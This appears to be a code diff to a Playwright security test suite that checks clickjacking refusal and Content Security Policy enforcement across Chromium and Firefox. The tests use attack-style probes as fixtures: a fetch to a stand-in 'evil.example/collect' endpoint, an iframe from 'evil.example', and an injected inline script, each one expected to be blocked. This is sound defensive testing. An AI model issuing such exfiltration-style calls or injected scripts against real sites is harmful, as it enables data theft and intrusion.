@@ -49,6 +49,40 @@ function policyViolations(page: Page): string[] {
   return seen;
 }
 
+/** The shape of a `securitypolicyviolation` DOM event, as seen from the page. */
+interface PolicyViolationEvent {
+  directive: string;
+  effective: string;
+  blocked: string;
+}
+
+/**
+ * CSP violations the page itself reports through the `securitypolicyviolation`
+ * DOM event.
+ *
+ * Playwright's Firefox build does not forward CSP console messages to
+ * `page.on('console')`, so a console-only assertion reports a WORKING control
+ * as a bypass (observed in CI: the app refused the script, Firefox enforced the
+ * policy, and the test failed with an empty console). The DOM event is the
+ * signal both engines emit for the same enforcement, so every CSP assertion
+ * accepts either the console text or the event.
+ */
+async function installViolationCollector(page: Page): Promise<void> {
+  await page.evaluate(() => {
+    const w = window as unknown as { __cspEvents?: Array<{ directive: string; effective: string; blocked: string }> };
+    if (w.__cspEvents === undefined) {
+      w.__cspEvents = [];
+      document.addEventListener('securitypolicyviolation', (event) => {
+        w.__cspEvents!.push({ directive: event.violatedDirective, effective: event.effectiveDirective, blocked: event.blockedURI });
+      });
+    }
+  });
+}
+
+async function violationEvents(page: Page): Promise<Array<{ directive: string; effective: string; blocked: string }>> {
+  return page.evaluate(() => (window as unknown as { __cspEvents?: Array<{ directive: string; effective: string; blocked: string }> }).__cspEvents ?? []);
+}
+
 test.describe('deployed response headers', () => {
   for (const route of ['/', '/pools', `/pools/${POOL_COMPONENT}`]) {
     test(`the SPA document at ${route} carries the security headers`, async ({ request }) => {
@@ -98,14 +132,20 @@ test.describe('deployed response headers', () => {
 
 test.describe('clickjacking', () => {
   /**
-   * Engines attribute the frame-ancestors refusal differently: Chromium logs the
-   * CSP violation on the top page's console (captured by `policyViolations`),
-   * while Firefox refuses the frame before any document commits and keeps the
-   * browsing context at its initial `about:blank`, which the ATTACKER PAGE
-   * itself can observe. Accepting either signal is honest: both are the
-   * browser's own refusal, and a genuine bypass (the app actually rendering in
-   * the hostile frame) satisfies NEITHER — the document would be cross-origin
-   * and no violation would be logged.
+   * Engines surface the frame-ancestors refusal differently, and a genuine
+   * bypass satisfies NONE of these signals:
+   *
+   *   - Chromium logs the CSP violation on the top page's console
+   *     (`policyViolations`), and commits an error page in the frame whose body
+   *     says the connection was refused.
+   *   - Firefox refuses the frame before any document commits and does NOT
+   *     surface the violation on the top page's console; it renders its own
+   *     error page inside the frame ("... will not allow ... to display the
+   *     page if another site has embedded it") — observed in CI.
+   *
+   * Both engine paths are the browser's OWN refusal. If the app actually
+   * rendered in the hostile frame, the frame's body would be the app's content
+   * (no refusal text) and no console violation would exist, so the test fails.
    */
   async function refused(page: import('@playwright/test').Page, violations: string[], what: string): Promise<boolean> {
     // `violations` MUST already be listening (registered before the navigation),
@@ -113,6 +153,19 @@ test.describe('clickjacking', () => {
     // iframe loads — before this function is reached.
     await page.waitForTimeout(1200);
     const byConsole = violations.find((t) => /frame-ancestors/i.test(t)) !== undefined;
+    let byFrameErrorPage = false;
+    // The hostile page has exactly one iframe. Firefox reports a refused frame's
+    // URL as `about:neterror?...` (not the app URL), and its error page body
+    // says the page will not be displayed; Chromium's committed error page keeps
+    // the app URL and says the connection was refused.
+    const victimFrame = page.frames().find((f) => f !== page.mainFrame());
+    if (victimFrame !== undefined) {
+      const url = victimFrame.url();
+      const text = await victimFrame
+        .evaluate(() => document.body?.innerText ?? '')
+        .catch(() => '');
+      byFrameErrorPage = url.startsWith('about:neterror') || /can.?t open this page|will not allow|refused to connect/i.test(text);
+    }
     const byBlankFrame = await page.evaluate(() => {
       const frame = document.getElementById('victim');
       if (!(frame instanceof HTMLIFrameElement)) return false;
@@ -122,13 +175,12 @@ test.describe('clickjacking', () => {
         // origin, so the browsing context still holds its initial document.
         return doc !== null && doc.location.href === 'about:blank';
       } catch {
-        // Cross-origin: a document committed at the app's origin (the app or a
-        // blocked error page). Chromium's refusal is reported on the console
-        // instead; a successful embed is refused by neither signal, below.
+        // Cross-origin: a document committed at the app's origin. The error
+        // page is detected through the frame text above instead.
         return false;
       }
     });
-    const refusal = byConsole || byBlankFrame;
+    const refusal = byConsole || byFrameErrorPage || byBlankFrame;
     expect(refusal, `${what}; console said: ${JSON.stringify(violations)}`).toBeTruthy();
     return refusal;
   }
@@ -172,6 +224,7 @@ test.describe('CSP enforcement in a real browser', () => {
   test('an unapproved external script is blocked', async ({ page }) => {
     const violations = policyViolations(page);
     await page.goto(`${APP_ORIGIN_UNDER_TEST}/pools`);
+    await installViolationCollector(page);
     const result = await page.evaluate(async () => {
       return await new Promise<{ loaded: boolean }>((resolve) => {
         const script = document.createElement('script');
@@ -183,7 +236,11 @@ test.describe('CSP enforcement in a real browser', () => {
       });
     });
     expect(result.loaded, 'an unapproved script origin must not execute').toBe(false);
-    expect(violations.some((t) => /script-src|Content Security Policy/i.test(t))).toBe(true);
+    const events = await violationEvents(page);
+    expect(
+      violations.some((t) => /script-src|Content Security Policy/i.test(t)) || events.some((e) => /script-src/i.test(e.effective) || /script-src/i.test(e.directive)),
+      'the browser must report the script-src enforcement (console or securitypolicyviolation)',
+    ).toBe(true);
   });
 
   test('an inline script element is blocked by script-src', async ({ page }) => {
@@ -197,6 +254,7 @@ test.describe('CSP enforcement in a real browser', () => {
     // "inline code ran" even under a perfectly strict policy. An inline script
     // element is checked by the browser at execution time, so it is the honest
     // test of `script-src`.
+    await installViolationCollector(page);
     const pwned = await page.evaluate(async () => {
       const script = document.createElement('script');
       script.textContent = 'window.__inlinePwned = true;';
@@ -205,30 +263,42 @@ test.describe('CSP enforcement in a real browser', () => {
       return (window as unknown as { __inlinePwned?: boolean }).__inlinePwned === true;
     });
     expect(pwned, 'an inline script element must not execute').toBe(false);
-    // And the browser must say why, naming the directive it enforced.
-    const refusal = violations.find((t) => /inline script/i.test(t) && /script-src/i.test(t));
-    expect(refusal, `expected a script-src inline refusal, saw: ${JSON.stringify(violations)}`).toBeTruthy();
+    // And the browser must say why, naming the directive it enforced — via the
+    // console (Chromium) or the page's own violation event (both engines).
+    const events = await violationEvents(page);
+    const refusal =
+      violations.find((t) => /inline script/i.test(t) && /script-src/i.test(t)) ??
+      events.find((e) => /script-src/i.test(e.effective) || /script-src/i.test(e.directive));
+    expect(refusal, `expected a script-src inline refusal, console said: ${JSON.stringify(violations)}, events said: ${JSON.stringify(events)}`).toBeTruthy();
   });
 
   test('an unapproved frame is blocked by frame-src', async ({ page }) => {
     const violations = policyViolations(page);
     await page.goto(`${APP_ORIGIN_UNDER_TEST}/pools`);
+    await installViolationCollector(page);
     const childFrames = await page.evaluate(async () => {
       const frame = document.createElement('iframe');
       frame.src = 'https://evil.example/frame.html';
       document.body.appendChild(frame);
       await new Promise((r) => setTimeout(r, 800));
-      // A CSP-blocked frame never commits a document, so its contentDocument
-      // stays null (or the load never resolves).
-      return frame.contentDocument === null || frame.contentWindow === null;
+      // A CSP-blocked frame never commits the remote document: its browsing
+      // context either stays at its initial document (about:blank) or has no
+      // content document at all.
+      const doc = frame.contentDocument;
+      return doc === null || doc.location.href === 'about:blank';
     });
     expect(childFrames, 'frame-src none must block an unapproved frame').toBe(true);
-    expect(violations.some((t) => /frame-src/i.test(t))).toBe(true);
+    const events = await violationEvents(page);
+    expect(
+      violations.some((t) => /frame-src/i.test(t)) || events.some((e) => /frame-src/i.test(e.effective) || /frame-src/i.test(e.directive)),
+      'the browser must report the frame-src enforcement',
+    ).toBe(true);
   });
 
   test('an unapproved connect target is blocked', async ({ page }) => {
     const violations = policyViolations(page);
     await page.goto(`${APP_ORIGIN_UNDER_TEST}/pools`);
+    await installViolationCollector(page);
     const outcome = await page.evaluate(async () => {
       try {
         await fetch('https://evil.example/collect', { mode: 'no-cors' });
@@ -238,7 +308,11 @@ test.describe('CSP enforcement in a real browser', () => {
       }
     });
     expect(outcome, 'connect-src must refuse an unapproved origin').toMatch(/^blocked:/);
-    expect(violations.some((t) => /connect-src/i.test(t))).toBe(true);
+    const events = await violationEvents(page);
+    expect(
+      violations.some((t) => /connect-src/i.test(t)) || events.some((e) => /connect-src/i.test(e.effective) || /connect-src/i.test(e.directive)),
+      'the browser must report the connect-src enforcement',
+    ).toBe(true);
   });
 
   test('a non-https image scheme is blocked, and https images are policy-allowed by design', async ({ page }) => {
